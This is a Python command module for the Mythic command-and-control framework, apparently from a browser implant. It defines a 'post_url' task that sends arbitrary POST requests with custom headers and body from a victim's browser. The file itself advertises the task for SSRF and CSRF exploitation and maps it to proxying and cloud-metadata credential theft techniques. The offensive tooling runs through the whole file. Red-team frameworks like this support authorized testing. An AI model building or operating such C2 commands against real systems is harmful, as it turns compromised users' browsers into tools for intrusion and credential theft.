from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class PostUrlArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="url",
                type=ParameterType.String,
                description="URL to POST to",
            ),
            CommandParameter(
                name="body",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(
                    required=False
                )],
                default_value="",
                description="Request body (JSON string or raw text)",
            ),
            CommandParameter(
                name="headers",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(
                    required=False
                )],
                default_value="",
                description='Custom headers as JSON object (e.g. {"Content-Type": "application/x-www-form-urlencoded"})',
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise ValueError("Must supply a URL")
        if self.command_line[0] == '{':
            self.load_args_from_json_string(self.command_line)
        else:
            self.add_arg("url", self.command_line)

    async def parse_dictionary(self, dictionary_arguments):
        self.load_args_from_dictionary(dictionary_arguments)


class PostUrlCommand(CommandBase):
    cmd = "post_url"
    needs_admin = False
    help_cmd = "post_url"
    description = "Make a POST request from the victim's browser with custom headers and body. Useful for SSRF, API interaction, CSRF exploitation."
    version = 1
    author = "@grampae"
    attackmapping = ["T1090", "T1552.005"]
    argument_class = PostUrlArguments
    attributes = CommandAttributes(
        supported_os=[SupportedOS.MacOS, SupportedOS.Linux, SupportedOS.Windows]
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        task.display_params = "POST {}".format(task.args.get_arg("url"))
        return task

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
